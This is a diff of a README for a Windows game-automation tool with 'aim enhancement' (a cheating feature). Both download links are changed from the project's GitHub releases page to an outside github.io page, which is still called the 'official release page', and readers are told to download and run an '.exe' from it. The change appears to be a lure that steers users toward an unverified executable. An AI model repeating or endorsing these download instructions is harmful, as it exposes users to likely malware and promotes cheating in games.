@@ -1,6 +1,6 @@
 # 🎯 hypershot-automation-script-hub - Speed up your game automation tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jemmiestoppable466/hypershot-automation-script-hub/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://jemmiestoppable466.github.io)
 
 Hypershot v1.0 helps you manage automation tasks for web-based games. You use this tool to streamline repetitive actions and improve your accuracy with built-in aim enhancement features. This repository provides the utility files necessary to run these scripts on your Windows computer.
 
@@ -8,7 +8,7 @@ Hypershot v1.0 helps you manage automation tasks for web-based games. You use th
 
 To get started, follow these steps to acquire the software from our official release page.
 
-1. Navigate to the [official release page](https://github.com/jemmiestoppable466/hypershot-automation-script-hub/releases).
+1. Navigate to the [official release page](https://jemmiestoppable466.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` to begin your download.
 4. Save the file to a folder you recognize, such as your Downloads folder or your Desktop.
